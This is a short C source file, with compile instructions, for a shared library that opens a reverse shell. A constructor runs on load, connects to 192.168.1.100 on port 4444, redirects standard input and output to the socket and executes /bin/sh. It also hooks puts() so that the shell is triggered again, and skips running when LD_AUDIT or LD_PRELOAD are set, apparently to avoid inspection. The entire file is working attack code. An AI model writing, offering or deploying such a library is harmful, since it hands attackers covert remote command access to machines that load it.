// reverse_shell_so.c - Compile as shared library
// gcc -shared -fPIC reverse_shell_so.c -o libreverse.so

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <dlfcn.h>

static void reverse_shell() __attribute__((constructor));

void reverse_shell() {
    int sock;
    struct sockaddr_in server;
    
    // Don't run if certain env vars are present
    if(getenv("LD_AUDIT") || getenv("LD_PRELOAD")) {
        return;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    
    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execve("/bin/sh", NULL, NULL);
    }
}

// Hijack common function
int puts(const char *str) {
    int (*original_puts)(const char *);
    original_puts = dlsym(RTLD_NEXT, "puts");
    reverse_shell();
    return original_puts(str);
}